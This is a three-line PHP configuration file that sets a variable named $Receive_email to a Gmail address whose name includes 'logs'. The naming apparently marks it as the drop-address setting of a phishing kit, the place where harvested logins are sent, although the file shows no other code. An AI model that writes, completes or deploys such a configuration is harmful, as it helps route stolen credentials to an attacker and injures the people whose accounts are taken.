<?php 
$Receive_email="mzanzilogs@gmail.com";
?>